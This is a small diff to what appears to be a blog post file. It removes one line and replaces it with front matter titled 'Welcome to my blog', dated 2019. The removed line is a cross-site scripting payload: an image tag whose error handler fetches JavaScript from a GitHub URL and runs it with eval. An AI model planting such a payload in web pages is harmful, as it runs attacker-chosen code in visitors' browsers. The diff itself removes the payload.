@@ -1,1 +1,4 @@
-<img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>
+---
+title: "Welcome to my blog"
+date: 2019-01-20
+---
